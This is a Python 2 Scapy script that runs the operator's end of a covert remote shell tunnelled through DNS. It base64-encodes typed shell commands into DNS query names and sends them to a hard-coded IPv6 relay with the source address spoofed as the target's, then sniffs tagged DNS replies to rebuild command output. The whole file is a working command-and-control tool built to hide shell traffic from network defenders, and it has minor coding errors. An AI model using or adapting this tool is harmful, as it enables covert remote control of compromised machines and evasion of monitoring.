#!/usr/bin/env python

from scapy.all import *
from sys import argv
import base64
first = True
message_r=""
recived_p=0
encoded_message =''
packets=0
opendns = "fe80::c6e9:84ff:fe32:8f85"
def print_usage():
	print("Usage :  ./dnssend [target ip] [my ip]")
	exit(1)

def check_response(message):
	global first,recived_p, message_r,packets
	if message == "AAo=":
		first= True
		#print message_r
		decoded_r =  base64.b64decode(message_r)
		print decoded_r
		packets=0
		message_r=""
		recived_p=0
		return 1
	if first:
		prolog = message[0:3]
		pakets= int(prolog)
		if int(prolog)> 5: print "Incoming packets: " + str(int(prolog))
		first = False
		recived_p+=1
		message_r+= message[3:]
		#print str(recived_p) +"/"+ str(packets)
		return 0
	recived_p+=1
	message_r+= message
	#print str(recived_p) +"/"+ str(packets)
	return 0

def listen_for(l_interface):
	while 1:
		DNSPacket = sniff(iface=l_interface, filter="src port 53", count=1)
		if ( DNSPacket[0].haslayer(DNS) ) and (DNSPacket[0].getlayer(DNS).id== 1223):
			response = DNSPacket[0].getlayer(DNS).qd.qname
			if response:
				if check_response(response[:-1]) ==1:
					return
			
def send_packet(packet_data,ip):
	encoded_message = base64.b64encode(packet_data)
	size = 60
	x=0
	encoded_message_size = len(encoded_message)
	if encoded_message_size > 60:
		prolog = str((encoded_message_size-60)/63 +1)
	else:
		prolog = "1"
	if len(prolog)==1:prolog = "00"+prolog 
	elif len(prolog)==2: prolog = "0"+prolog
	#print prolog
	while True:
        	bytes = prolog + encoded_message[x:x+size]
        	if bytes != prolog: 	
			DNSpacket = IPv6(dst=opendns, src=ip)/UDP(sport=RandShort())/DNS(id= 1222, rd=0 ,z=1,tc=1, qd=DNSQR(qname=bytes, qtype="A", qclass="IN"))
			send(DNSpacket, verbose=0)
		else:
			DNSpacket = IPv6(dst=opendns, src=ip)/UDP(sport=RandShort())/DNS(id= 1222, rd=0 ,z=1,tc=1, qd=DNSQR(qname="AAo=", qtype="A", qclass="IN"))
			send(DNSpacket, verbose=0)
			listen_for('wlan0')
			break
		time.sleep(0.8)
		x+=size
		size = 63
		prolog=""



def estabilish_conn(my_ip , ip):
	DNSpacket = IPv6(dst=opendns, src=ip)/UDP(sport=RandShort())/DNS(id= 1222, rd=0 ,z=1,tc=1, qd=DNSQR(qname= "000" + base64.b64encode(my_ip), qtype="A", qclass="IN"))
	send(DNSpacket, verbose=0)
	listen_for("wlan0")


def main():
	if len(argv) != 3 :
		print_usage()
	ip = argv[1]
	my_ip=argv[2]
	estabilish_conn(my_ip, ip)# send my ip addr
	while 1:
		send_packet(raw_input("Shell $"),ip)
        exit(0)

if __name__ == "__main__":
   main()
